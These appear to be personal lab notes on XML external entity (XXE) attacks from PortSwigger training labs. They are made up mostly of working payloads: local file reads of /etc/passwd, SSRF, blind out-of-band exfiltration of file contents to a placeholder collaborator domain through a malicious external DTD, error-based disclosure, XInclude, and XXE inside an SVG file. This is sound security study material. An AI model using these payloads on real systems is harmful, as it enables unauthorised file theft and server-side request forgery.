# XXE
## Reading files using XXE Injection 
- Let's say the webpage is sending a request as an XML something like 
```XML
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			2
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```
- We can inject another entity that will read the contents of a particular file and send its output through the request
```XML
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd">]>
	<stockCheck>
		<productId>
			&ent;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```
## SSRF using XXE
- So in this lab there's another host up that the lab can access, to access resources from that lab... 
```XML
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://another-host.com">]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```
- Now, instead `productID` I get `Couldn't find product ID "latest"`
![](Pasted%20image%2020220309173359.png)
- Trying to access resources from http://aonther-host.com/latest 
![](Pasted%20image%2020220309173448.png)
- Doing the same thing again and again till I get some interesting information
- After a few more times 
![](Pasted%20image%2020220309173617.png)
## Blind XXE with out-of-band interaction
- same as the previous one, the only difference is in this one we host a domain and make request to that domain
## Blind XXE with out-of-band interaction via XML parameter entities 
- The payload: 
```
<!DOCTYPE stockCheck [<!ENTITY % [xxe](https://portswigger.net/web-security/xxe) SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> %xxe; ]>
```
## Blind XXE to exfiltrate data using a malicious external DTD 
- The payload
```
<!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>"> %eval; %exfil;
```
## Blind XXE to retrieve data via Error messages
- The payload to upload on the server: 
```
<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> %eval; %exfil;
```
- After it's imported it will read contents of /etc/passwd into the `file` entity and then we can try to use that entity in a file path 
- Intercepted the request from the client and added this in there... 
```
<!DOCTYPE foo [<!ENTITY % [xxe](https://portswigger.net/web-security/xxe) SYSTEM "YOUR-DTD-URL"> %xxe;]>
```
## XInclude to retrieve files 
> Some applications will receive client-submitted data, embed it on the server-side into an XML document and then parse the document. If there is ever an opportunity to look for an attack surface it is exactly in this scenario: when a server takes arbitrary input and does something with it.
- Although we can't insert an entire DTD (that XXE payload thing), we still can include 'XInclude' statements in the requests. 
- The payload: 
```
productId=<foo xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
## XXE inside SVG image
- The payload: 
```

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE text [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
	<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    	&xxe;
	</svg>
```